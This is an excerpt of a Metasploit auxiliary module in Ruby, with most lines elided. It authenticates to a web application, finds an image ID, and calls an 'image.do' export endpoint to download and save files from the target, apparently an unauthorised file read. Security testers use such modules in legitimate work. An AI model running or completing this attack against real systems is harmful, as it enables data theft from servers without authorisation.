...
class MetasploitModule < Msf::Auxiliary
  ...
  def authenticate
    res = send_request_cgi('uri' => normalize_uri(datastore['TARGETURI'], 'userSession.do'),
                           'method' => 'POST',
                           'vars_post' => {
    ...
    begin
      ...
      if res && res.code == 200 && res.body.to_s =~ /"success":true/
        ...
        if res && res.code == 200 && res.body.to_s =~ /"imageId":"([0-9]*)","fileName":"#{filename}"/
          ...
          return send_request_cgi('uri' => normalize_uri(datastore['TARGETURI'], 'data', 'config', 'image.do'),
                                  'method' => 'GET',
                                  'cookie' => cookie,
                                  'vars_get' => {
                                    'method' => 'export',
  ...
  def run
    ...
    if res && res.code == 200
      if res.body.to_s.bytesize != 0 && !(res.body.to_s =~ /This file does not exist./) && !(res.body.to_s =~ /operation is failed/)
        save_file(res.body)
        return
      end
    end
